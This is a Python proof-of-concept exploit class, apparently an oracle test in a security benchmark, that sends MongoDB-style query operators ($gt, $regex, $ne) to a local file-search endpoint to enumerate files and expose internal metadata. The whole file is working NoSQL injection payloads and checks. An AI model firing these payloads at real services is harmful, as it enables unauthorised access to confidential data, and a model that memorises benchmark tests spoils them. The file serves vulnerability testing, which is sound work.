"""PoC: NoSQL-style injection via query operators in file search (CWE-89/943).

Stage 3 adds MongoDB-style operators ($gt, $regex, $ne) that apply to
ALL file metadata fields including internalTag. An attacker can
enumerate confidential files and extract internal metadata.
"""
import json
from mosaic.oracle.exploit import ExploitTest


class FileuploadNosqlInjectionExploit(ExploitTest):
    """NoSQL injection: access internal file metadata via query operators."""

    def __init__(self, base_url: str = "http://localhost:39120"):
        super().__init__(base_url)

    @property
    def chain_id(self) -> str:
        return "fileupload_dynamic_query"

    def setup(self) -> None:
        pass

    def execute(self) -> tuple[bool, str]:
        evidence = []

        # Test 1: Use $gt on size to get all files > 0 bytes
        filter_payload = json.dumps({"size": {"$gt": 0}})
        resp = self.http_get(
            "/files/search",
            params={"filter": filter_payload},
        )
        evidence.append(f"$gt size>0: HTTP {resp.status_code}")

        if resp.ok:
            data = resp.json()
            if isinstance(data, list):
                count = len(data)
                evidence.append(f"$gt matched {count} files (list response)")
                files_list = data
            else:
                count = data.get("count", 0)
                evidence.append(f"$gt matched {count} files")
                files_list = data.get("files", [])

            # Test 2: $regex on internalTag to find confidential files
            filter2 = json.dumps({"internalTag": {"$regex": ".*"}})
            resp2 = self.http_get(
                "/files/search",
                params={"filter": filter2},
            )
            if resp2.ok:
                data2 = resp2.json()
                if isinstance(data2, list):
                    tagged = len(data2)
                    files = data2
                else:
                    tagged = data2.get("count", 0)
                    files = data2.get("files", [])
                evidence.append(f"$regex internalTag: {tagged} files")
                if not isinstance(files, list):
                    files = []
                internal_found = any(
                    f.get("internalTag") for f in files if isinstance(f, dict)
                )
                if internal_found:
                    evidence.append("Internal metadata exposed in response!")

            # Test 3: $ne to bypass filters
            filter3 = json.dumps({"uploadedBy": {"$ne": "nobody"}})
            resp3 = self.http_get(
                "/files/search",
                params={"filter": filter3},
            )
            if resp3.ok:
                data3 = resp3.json()
                ne_count = len(data3) if isinstance(data3, list) else data3.get('count', 0)
                evidence.append(f"$ne matched {ne_count} files")

            if count > 0:
                return True, (
                    "CWE-89/943 confirmed. File search accepts query operators "
                    "($gt, $regex, $ne) that apply to ALL fields including "
                    "internalTag. Attacker can enumerate confidential files. "
                    + " | ".join(evidence)
                )

        if resp.status_code == 404:
            return False, "Search endpoint not found. " + " | ".join(evidence)

        return False, "Not vulnerable. " + " | ".join(evidence)
